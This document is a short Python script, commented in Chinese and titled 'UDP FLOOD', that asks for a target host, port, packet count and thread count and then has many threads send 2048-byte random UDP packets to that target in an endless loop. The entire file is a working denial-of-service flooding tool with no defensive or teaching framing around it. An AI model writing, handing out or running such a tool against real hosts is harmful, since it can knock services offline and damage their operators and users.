import random
import socket
import threading
import sys

#输出信息
print("#-- UDP FLOOD --#")
#保存IP地址
ip = str(input(" Host/Ip:"))
#保存端口号
port = int(input(" Port:"))
#保存发包数
times = int(input(" Packets per one connection:"))
#保存线程数
threads = int(input(" Threads:"))

def run():
    #数据选择
    data = random._urandom(2048)#随机产生2048个字节的字符串
    #循环发送数据包
    while True:
        try:
            for x in range(times):
                s.sendto(data, addr)#发送UDP数据包
        except:
            print("[!] Error!!!")

def exit_func():
    while 1:
        exit_ = input("exit input QE")
        if exit_ == "QE":
            sys.exit()

thread_lst = []  #定义线程列表，将所有线程对象保存在列表中
s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#套接字UDP报文选择
addr = (str(ip), int(port))

#迭代线程列表，将实例的线程对象保存到线程列表中
for i in range(threads):
    th = threading.Thread(target=run)
    thread_lst.append(th)

e_th = threading.Thread(target=exit_func)
e_th.start()

#循环启动所有线程对象
for i in thread_lst:
    i.start()

#等待所有线程执行完成
for i in thread_lst:
    i.join() #将多个线程路径组合后返回
